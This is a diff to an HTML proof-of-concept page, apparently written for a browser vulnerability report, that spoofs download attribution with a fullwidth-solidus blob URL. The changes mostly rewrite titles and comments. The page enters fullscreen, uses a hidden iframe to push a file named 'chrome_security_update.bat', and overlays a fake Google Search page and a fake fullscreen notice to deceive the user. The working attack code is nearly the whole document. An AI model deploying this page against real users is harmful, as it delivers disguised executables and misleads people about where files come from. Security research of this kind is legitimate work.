@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC: Blob URL Origin Spoofing via Fullwidth Solidus</title>
+<title>Bypass Origin to Remove Source Display in Fullscreen via Blob URL Fullwidth Solidus</title>
 <style>
   body {
     margin: 0;
@@ -25,9 +25,9 @@
   }
 
   .title {
-    font-size: 1.3rem;
+    font-size: 1.4rem;
     font-weight: 700;
-    line-height: 1.6;
+    line-height: 1.5;
     margin-bottom: 20px;
     max-width: 800px;
     color: #202124;
@@ -168,15 +168,15 @@
     border: 1px solid #dadce0;
     color: #202124;
   }
-  /* ------------------------------ */
 </style>
 </head>
 <body>
 
-  <!-- Initial View: Explicitly states the vulnerability being tested -->
+  <!-- Initial View: Displays PoC information and attack trigger button -->
   <div class="container" id="initial-view">
     <div class="title">
-      PoC: Download Attribution Bypass via Fullwidth Solidus
+      Bypass Origin to Remove Source Display<br>
+      in Fullscreen via Blob URL Fullwidth Solidus
     </div>
     <div class="subtitle">
       Injection Vector:<br>
@@ -188,9 +188,8 @@
     </button>
   </div>
 
-  <!-- Fake Content View (Shown after fullscreen) - GOOGLE SEARCH UI -->
+  <!-- Fake Content View: Google Search UI shown after entering fullscreen mode -->
   <div class="fake-content" id="fake-view">
-    <!-- Simulated search UI -->
     <div class="centered">
       <div class="google-logo"></div>
       <div class="search-bar">
@@ -203,15 +202,19 @@
     </div>
   </div>
 
-  <!-- Fake Browser Toast Notification -->
+  <!-- Fake Browser Toast: Simulates fullscreen notification to deceive user -->
   <div id="fake-fullscreen-toast">
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #8ab4f8;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
     <span>google.com is now in full screen. Press Esc to exit.</span>
   </div>
 
   <script>
+    /**
+     * Main attack sequence function
+     * Triggers fullscreen mode, executes download payload, and switches to fake UI
+     */
     function initiateAttackSequence() {
-      // 1. Request Real Fullscreen
+      // Step 1: Request browser fullscreen mode
       const elem = document.documentElement;
       if (elem.requestFullscreen) {
         elem.requestFullscreen();
@@ -219,15 +222,15 @@
         elem.webkitRequestFullscreen();
       }
 
-      // 2. Execute Background Payload
+      // Step 2: Execute background download payload via hidden iframe
       executeDownloadPayload();
 
-      // 3. UI Redressing Sequence
+      // Step 3: UI redressing - switch to fake Google Search interface
       setTimeout(() => {
         document.getElementById('initial-view').style.display = 'none';
         document.getElementById('fake-view').classList.add('active');
         
-        // Show fake toast after real browser toast fades
+        // Display fake fullscreen toast notification after delay
         setTimeout(() => {
           document.getElementById('fake-fullscreen-toast').classList.add('visible');
         }, 2500);
@@ -235,13 +238,18 @@
       }, 500);
     }
 
+    /**
+     * Download payload execution
+     * Creates hidden iframe with blob URL origin spoofing via fullwidth solidus injection
+     * This bypasses true origin display in download attribution
+     */
     function executeDownloadPayload() {
       const iframe = document.createElement('iframe');
       iframe.sandbox = 'allow-scripts allow-downloads'; 
       iframe.style.display = 'none'; 
       document.body.appendChild(iframe);
 
-      // PAYLOAD UTAMA TETAP SAMA SESUAI PERMINTAAN
+      // Payload: Creates .bat file with spoofed blob URL origin
       const iframeHTML = `
         <!DOCTYPE html>
         <html><body><script>
@@ -268,20 +276,23 @@
           ];
           const batContent = batLines.join('\\r\\n');
 
+          // Create blob URL for the .bat file
           const blob = new Blob([batContent], { type: "application/octet-stream" });
           const realUrl = URL.createObjectURL(blob);
           const uuid = realUrl.split("/").pop();
 
-          // INJEKSI FULLWIDTH SOLIDUS UNTUK SPOOFING ORIGIN
+          // INJECTION: Fullwidth solidus (U+FF0F) in blob URL fragment to spoof origin
           const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
           const filename = "chrome_security_update.bat";
 
+          // Trigger download with spoofed origin
           const a = document.createElement("a");
           a.href = spoofedUrl;
           a.download = filename;
           document.body.appendChild(a);
           a.click();
 
+          // Cleanup: remove element and revoke blob URL
           setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
         <\/script></body></html>
       `;
@@ -289,7 +300,10 @@
       iframe.srcdoc = iframeHTML;
     }
 
-    // Exit fullscreen handler to clean up fake toast
+    /**
+     * Fullscreen change event handler
+     * Cleans up fake UI and toast when user exits fullscreen mode
+     */
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement) {
         document.getElementById('fake-fullscreen-toast').classList.remove('visible');
